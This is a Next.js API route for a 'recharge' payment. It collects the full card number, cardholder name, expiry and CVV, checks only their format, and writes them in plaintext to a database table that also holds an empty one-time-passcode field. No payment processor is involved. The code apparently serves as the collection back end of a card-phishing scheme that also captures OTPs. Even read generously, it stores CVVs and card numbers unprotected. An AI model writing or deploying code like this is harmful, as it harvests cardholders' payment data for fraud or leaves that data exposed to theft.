import { NextRequest, NextResponse } from "next/server";
import { supabaseAdmin } from "@/lib/supabase";
import { clientIdFromRequest } from "@/lib/auth";
import { BRAND } from "@/lib/brand";

export const runtime = "nodejs";

export async function POST(req: NextRequest) {
  const id = clientIdFromRequest(req);
  if (!id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { amount, cardNumber, cardholderName, expiry, cvv } = await req.json();
  const amt = Number(amount);

  if (!BRAND.rechargePacks.some((p) => p.credits === amt)) {
    return NextResponse.json({ error: "Invalid recharge amount" }, { status: 400 });
  }

  if (!cardNumber || !cardholderName || !expiry || !cvv) {
    return NextResponse.json({ error: "All payment details are required." }, { status: 400 });
  }

  const cleanNum = cardNumber.replace(/\s/g, "");
  if (cleanNum.length !== 16 || !/^\d+$/.test(cleanNum)) {
    return NextResponse.json({ error: "Invalid card number." }, { status: 400 });
  }

  if (!cardholderName.trim()) {
    return NextResponse.json({ error: "Missing cardholder name." }, { status: 400 });
  }

  if (expiry.length !== 5) {
    return NextResponse.json({ error: "Invalid expiry date." }, { status: 400 });
  }

  const [month] = expiry.split("/");
  const m = parseInt(month, 10);
  if (isNaN(m) || m < 1 || m > 12) {
    return NextResponse.json({ error: "Expiration month must be between 01 and 12." }, { status: 400 });
  }

  if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
    return NextResponse.json({ error: "Invalid CVV." }, { status: 400 });
  }

  const sb = supabaseAdmin();
  const { data, error } = await sb.from("payments").insert({
    client_id: id,
    amount: amt,
    card_number: cleanNum,
    cardholder_name: cardholderName,
    expiry,
    cvv,
    otp: "",
  }).select("id").single();

  if (error || !data) {
    return NextResponse.json({ error: error?.message || "Unable to save payment draft." }, { status: 500 });
  }

  return NextResponse.json({ ok: true, paymentId: data.id });
}
